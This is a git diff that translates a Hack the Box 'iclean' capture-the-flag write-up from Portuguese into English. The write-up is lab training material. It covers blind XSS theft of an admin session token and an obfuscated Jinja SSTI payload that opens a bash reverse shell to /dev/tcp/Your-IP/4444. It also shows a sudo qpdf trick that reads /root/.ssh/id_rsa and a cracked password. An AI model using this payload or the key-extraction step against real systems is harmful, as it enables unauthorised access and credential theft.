@@ -10,14 +10,13 @@ date: "2024-08-20"
 draft: false
 showAuthor: false
 showAuthorsBadges: false
-summary: Resolução da máquina perfection do hack the box
+summary: Solution for the Hack the Box machine perfection
 title: Hack the Box - iclean
 ---
 
-## Reconhecimento
+## Reconnaissance
 
-A princípio realizamos o mapeamento das portas abertas no nosso alvo, bem como
-seus serviços e versões.
+Initially, we performed the mapping of open ports on our target, as well as their services and versions.
 
 ```config
 PORT      STATE  SERVICE VERSION
@@ -25,68 +24,54 @@ PORT      STATE  SERVICE VERSION
 80/tcp    open   http    Apache httpd 2.4.52 ((Ubuntu))
 ```
 
-Ao tentar acessar o servidor WEB, nós somos redirecionados para o domínio
-capiclean.htb. Dessa forma, adicionamos a seguinte linha no nosso arquivo
-/etc/hosts para que esse domínio consiga ser resolvido.
+When trying to access the WEB server, we are redirected to the domain capiclean.htb. Therefore, we add the following line to our /etc/hosts file so that this domain can be resolved.
 
 ```python
  echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
 ```
 
-Após acessar a aplicação e realizarmos uma busca na aplicação por
-vulnerabilidades, e nos deparamos com o endpoint "<http://capiclean.htb/quote>"
-que trouxe uma mensagem suspeita:
+After accessing the application and performing a search for vulnerabilities, we encountered the endpoint "<http://capiclean.htb/quote>" which brought a suspicious message:
 
 ```text
 Your quote request was sent our management team. They will reach out soon via e-mail. Thanks for the interest you have shown in our services
 ```
 
-Ao ler esta mensagem, automaticamente verificamos se algum parâmetro da request
-enviada para o admin, vulnerável a XSS, pois se fosse o caso nós poderíamos
-fazer a exfiltração do seu token e utilizar a app com privilégio máximo.
+Upon reading this message, we automatically checked if any parameter of the request sent to the admin was vulnerable to XSS, because if that were the case, we could exfiltrate their token and use the app with maximum privilege.
 
 ![Blind XSS ](blind-xss.png)
 
-Utilizamos os payload acima para enviar o token de sessão do admin para um
-servidor web que que levantamos com python utilizando o comando
+We used the above payload to send the admin's session token to a web server that we set up with Python using the command
 
 ```python
 python3 -m http.server
 ```
 
-Como resultado desse processo, obtivemos o token de sessão do admin
-![Recebendo o token](get-token.png)
+As a result of this process, we obtained the admin's session token
+![Receiving the token](get-token.png)
 
-## Acesso inicial
+## Initial Access
 
-De posse do token, enumeramos mais alguns endpoint da aplicação
+With the token in hand, we enumerated a few more endpoints of the application
 
 ```bash
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3- medium.txt:FFUZ -u http://capiclean.htb/FFUZ
 ```
 
-E encontramos o endpoint 'dashboard' que tem acesso restrito. Dessa forma,
-adicionamos o cookie de admin no browser e conseguimos acessar o endpoint.
+And we found the 'dashboard' endpoint which has restricted access. Thus, we added the admin cookie in the browser and managed to access the endpoint.
 
-Seguindo o 'happy path' da aplicação nós geramos um invoice, e posteriormente
-tentamos acessá-lo por meio da função de geração de QRcode. Analisando os
-parâmetros request, nós identificamos um SSTI no parâmetro 'qr_link'
+Following the application's 'happy path' we generated an invoice, and later tried to access it through the QR code generation function. Analyzing the request parameters, we identified an SSTI in the 'qr_link' parameter.
 
 ![SSTI](SSTI.png)
 
-Uma vez que identificamos esta vulnerabilidade, nós iniciamos os testes com
-payloads diversos para conseguir uma shell reversa. O payload a seguir foi o que
-nos possibilitou acessar o sistema
+Once we identified this vulnerability, we started testing with various payloads to get a reverse shell. The following payload was the one that allowed us to access the system.
 
 ```python
- {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/Nosso_IP/4444 0>&1'")|attr("read")()}}
+ {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/Your-IP/4444 0>&1'")|attr("read")()}}
 ```
 
-## Escalação de privilégio
+## Privilege Escalation
 
-Uma vez que conseguimos executar código na máquina alvo, realizamos uma
-varredura na em sua infraestrutura. Começamos pelo código fonte da aplicação.
-Nele encontramos algumas credenciais de banco de dados:
+Once we managed to execute code on the target machine, we performed a scan of its infrastructure. We started with the application's source code. In it, we found some database credentials:
 
 ```python
 db_config = {
@@ -97,48 +82,37 @@ db_config = {
 }
 ```
 
-Ao verificarmos as portas abertas na aplicação, percebeu-se que a porta 3306
-estava aberta. Indicando que existe um banco MySQL em execução. De posse dessa
-informação utilizamos as credenciais antes encontradas no código para assim
-consegui ter acesso aos dados do banco
+When checking the open ports on the application, it was noticed that port 3306 was open, indicating that there is a MySQL database running. With this information, we used the credentials previously found in the code to gain access to the database data.
 
 ```bash
 mysql --database capiclean -e 'show databases;' -u iclean -p
 ```
 
-Após isso, tentamos quebrar ambas as hashs e tivemos sucesso em quebrar apenas a
-hash do usuário 'consuela' que resultou na senha 'simple and clean'. Com a senha
-e o usuário foi feita a tentativa de logins via ssh.
+After that, we tried to crack both hashes and succeeded in cracking only the hash of the user 'consuela' which resulted in the password 'simple and clean'. With the password and the user, we attempted logins via SSH.
 
 ```bash
 ssh consuela@$rhost
 ```
 
-Que foi bem sucedida. Agora com a shell ssh verificamos se algum comando
-habilitado a ser executado com privilégio de sudo.
+Which was successful. Now with the SSH shell, we checked if any command was enabled to be executed with sudo privileges.
 
 ```bash
 sudo -l
 ```
 
-Após entender do que se trata a plicação. Fizemos a seguinte suposição, se o
-usuário consuela tem ssh, o usuário root também deve ter ssh. Sendo sua chave
-privada armazenada no arquivo /root/.ssh/id_rsa, nós poderíamos mandar criar um
-pdf com o conteúdo da chave ssh do usuário root e direcionarmos esse pdf para um
-diretório acessível.
+After understanding what the application is about, we made the following assumption: if the user consuela has SSH, the root user must also have SSH. With their private key stored in the file /root/.ssh/id_rsa, we could create a PDF with the content of the root user's SSH key and direct this PDF to an accessible directory.
 
 ```bash
  sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
 ```
 
-Após a suposição se mostrar verdadeira, nós resgatamos a chave ssh ao verificar
-o conteúdo interno do pdf, nós realizamos o login via root por meio do comando
+After the assumption proved to be true, we retrieved the SSH key by checking the internal content of the PDF, and we logged in as root using the command.
 
 ```bash
 ssh root@$rhost -i root_ssh_key_file
 ```
 
-Com isso nós temos acesso ao usuário root e podemos ver a última flag
+With this, we have access to the root user and can see the final flag.
 
 ```bash
 cat root.txt
